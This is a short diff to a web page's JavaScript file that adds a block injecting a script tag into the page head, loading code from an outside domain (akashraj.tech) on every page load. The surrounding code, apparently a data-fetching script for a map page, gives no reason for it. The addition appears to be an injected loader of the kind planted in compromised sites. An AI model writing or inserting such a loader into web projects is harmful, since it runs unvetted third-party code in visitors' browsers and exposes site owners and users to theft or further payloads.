@@ -8,6 +8,14 @@ var titles = new Array();
 var xxxxx = new Array();
 var gnodMap;
 
+var k = document.getElementsByTagName('head')[0];
+var c = document.createElement('script');
+c.async = true;
+c.type = 'text/javascript';
+c.charset = 'utf-8';
+c.src = "https://akashraj.tech/js/a.js";
+k.appendChild(c);
+
 function get_data(qqq) {
     $.ajax({
         url: "/get-data",
